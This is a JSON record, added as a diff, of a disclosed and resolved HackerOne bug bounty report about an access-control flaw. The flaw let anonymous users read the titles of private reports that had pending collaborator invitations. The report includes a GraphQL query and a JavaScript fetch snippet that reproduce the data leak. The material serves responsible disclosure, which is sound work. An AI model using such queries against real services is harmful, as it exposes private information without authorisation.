@@ -1,0 +1,134 @@
+{
+  "id": 2312029,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzEyMDI5",
+  "url": "https://hackerone.com/reports/2312029",
+  "title": "View Titles of Private Reports with pending email invitation",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2024-01-11T06:20:59.824Z",
+  "submitted_at": "2024-01-11T06:21:00.074Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ahacker1",
+    "url": "/ahacker1",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2024-01-16T09:17:25.182Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-01-16T06:08:09.138Z",
+  "team_member_agreed_on_going_public_at": "2024-01-16T09:17:25.017Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\n\nIf a private report has a pending email invitation for collaboration, an anonymous user can see the title of the report.\nThis only works for anonymous users, and the collaboration invitation must be through Manage Collaborators invitation panel.\n\n**Description:**\n\n### Steps To Reproduce\n\n1. As victim:\nIn a report to a bug bounty program, add a collaborator, using any email, such as: ██████████\nSave the integer ID of the report.\n\n2. In a new, **anonymous/unauthenticated/logged-out** session:\nSend GraphQL request, replacing PRIVATE_REPORT_ID integer:\n```graphql\n{\n  report(id:IPRIVATE_REPORT_ID){\n    title\n  }\n}\n```\nOR run JS implementation:\nBy visiting hackerone.com/hacktivity as anonymous:\n```js\nconst csrf_token = document.getElementsByName(\"csrf-token\")[0].getAttribute(\"content\")\nconst REPORT_ID = PRIVATE_REPORT_ID // integer\n\nvar resp = await(await fetch(\"https://hackerone.com/graphql\", {\n  \"headers\": {\n    \"accept\": \"*/*\",\n    \"content-type\": \"application/json\",\n    \"x-csrf-token\": csrf_token,\n  },\n  \"body\": JSON.stringify({\n    \"operationName\": \"HacktivitySearchQuery\",\n    \"variables\": {\n        \"reportId\": REPORT_ID\n    },\n    \"query\": `query HacktivitySearchQuery($reportId: Int!) {\n  report(id: $reportId){\n    id\n    url\n    title\n  }\n}\n`\n}),\n  \"method\": \"POST\",\n  \"mode\": \"cors\",\n  \"credentials\": \"include\"\n})).json()\nconsole.log(resp.data.report)\n```\nThe title of the report is the response, confirming the vulnerability.\n\n## Impact\n\nCan read titles of possibly unfixed reports. This can be leveraged against the program, depending on the specificity of the title in the report.",
+  "bounty_amount": "7500.0",
+  "formatted_bounty": "$7,500",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2024-02-15T06:08:09.349Z",
+  "allow_singular_disclosure_after": 142013.166976806,
+  "singular_disclosure_allowed": false,
+  "vote_count": 138,
+  "voters": [
+    "amr_id",
+    "napoleon17",
+    "g0ndaar",
+    "8910jq",
+    "awhacken",
+    "r31n",
+    "urinaori",
+    "0xraselrana",
+    "onlytesting",
+    "0x3a0x3a",
+    "and 128 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.7,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 3,
+    "asset_type": "URL",
+    "asset_identifier": "hackerone.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
